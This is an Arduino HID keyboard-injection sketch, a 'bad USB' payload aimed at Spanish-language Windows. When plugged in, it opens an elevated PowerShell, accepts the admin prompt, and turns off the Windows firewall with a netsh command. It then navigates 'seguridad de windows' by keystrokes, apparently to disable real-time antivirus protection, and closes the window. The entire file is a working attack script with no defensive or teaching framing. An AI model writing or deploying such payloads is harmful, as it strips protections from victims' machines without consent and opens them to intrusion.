#include <HIDKeyboard.h>
HIDKeyboard keyboard;

void setup() {
  keyboard.begin();
  delay(2000);
}

void loop() {
  keyboard.pressKey(GUI, 'x');  // open up powershell
  keyboard.releaseKey();
  delay(350);
  keyboard.pressKey('a');
  keyboard.releaseKey();
  delay(700);
  keyboard.pressSpecialKey(LEFTARROW);
  keyboard.releaseKey();
  delay(100);
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();

  delay(800);

  keyboard.println("netsh advfirewall set currentprofile state off");

  delay(100);

  keyboard.println("exit");

  delay(500);

  keyboard.pressSpecialKey(CTRL, ESCAPE);
  keyboard.releaseKey();
  delay(700);

  keyboard.println("seguridad de windows");
  delay(100);
  
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  delay(700);

  keyboard.pressSpecialKey(TAB);
  keyboard.releaseKey();
  delay(100);
  keyboard.pressSpecialKey(TAB);
  keyboard.releaseKey();
  delay(100);
  keyboard.pressSpecialKey(TAB);
  keyboard.releaseKey();
  delay(100);
  keyboard.pressSpecialKey(TAB);
  keyboard.releaseKey();
  delay(100);

  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  delay(500);

  keyboard.pressSpecialKey(TAB);
  keyboard.releaseKey();
  delay(100);
  keyboard.pressSpecialKey(TAB);
  keyboard.releaseKey();
  delay(100);
  keyboard.pressSpecialKey(TAB);
  keyboard.releaseKey();
  delay(100);
  keyboard.pressSpecialKey(TAB);
  keyboard.releaseKey();
  delay(100);

  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  delay(700);

  keyboard.pressSpecialKey(SPACEBAR);
  keyboard.releaseKey();
  delay(700);

  keyboard.pressSpecialKey(LEFTARROW);
  keyboard.releaseKey();
  delay(100);
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();

  delay(500);

  keyboard.pressSpecialKey(ALT, F4);
  keyboard.releaseKey();

  while(1);
}